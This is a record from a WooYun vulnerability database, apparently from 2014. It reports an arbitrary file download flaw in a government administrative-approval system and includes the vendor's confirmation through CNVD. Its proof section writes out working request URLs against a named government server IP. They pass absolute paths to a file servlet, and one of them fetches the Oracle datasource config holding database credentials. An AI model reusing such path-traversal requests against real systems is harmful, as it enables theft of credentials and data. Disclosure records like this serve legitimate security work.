{"id": 54927, "wybug_id": "wooyun-2014-062770", "wybug_title": "某通用政务系统全服务器任意文件下载漏洞", "wybug_corp": "黑龙江海康软件工程有限公司", "wybug_author": "飞扬风", "wybug_date": "2014-06-05 11:39", "wybug_open_date": "2014-09-03 11:40", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "12", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["任意文件下载"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-06-05：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-06-09：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-06-12：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-08-03：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-08-13：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-08-23：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-09-03：\t细节向公众公开  简要描述： 任意文件下载，而且下载路径还是绝对路径~ 详细说明：  漏洞存在于黑龙江海康软件工程有限公司开发的行政审批系统通过谷歌搜索发现，在用的有哈尔滨市行政服务中心方正县行政审批服务中心木兰县行政审批服务中心依兰行政服务中心等等   漏洞证明：  以哈尔滨市行政审批服务中心为例，来说明任意文件下载存在于表格下载处，正常的一个表格下载链接如下http://218.9.149.56/fileFetcherServlet?filePath=D:\\HIGHCOM\\jboss-4.0.4.GA\\jboss-4.0.4.GA\\server\\default\\deploy\\xzsp_hrb_oracle.war\\serviceForm\\serviceFormCRE308861195010631015.rar&downloadName=%C6%F3%D2%B5%D7%A2%CF%FA%B5%C7%BC%C7%C9%EA%C7%EB%CA%E9.rarfilepath后面直接跟着绝对路径，这就导致如果知道路径的前提下可以随意下载服务器上的任意文件，downloadname就是下载后的文件名另外此处也泄漏网站的绝对路径=D:\\HIGHCOM\\jboss-4.0.4.GA\\jboss-4.0.4.GA\\server\\default\\deploy\\xzsp_hrb_oracle.war\\下载一个数据库配置来看一下http://218.9.149.56/fileFetcherServlet?filePath=D:\\HIGHCOM\\jboss-4.0.4.GA\\jboss-4.0.4.GA\\server\\default\\deploy\\oracle-ds.xml&downloadName=oracle-ds.xml\n\n   修复方案：  限制可下载的目录   版权声明：转载请注明来源 飞扬风@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：14  确认时间：2014-06-09 23:06 厂商回复： CNVD确认并在多个实例上复现所述漏洞，根据测试实例，已经转由CNCERT下发给黑龙江分中心，要求其后续联系软件生产厂商并通报相关部门实例情况。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 14, "Ranks": null}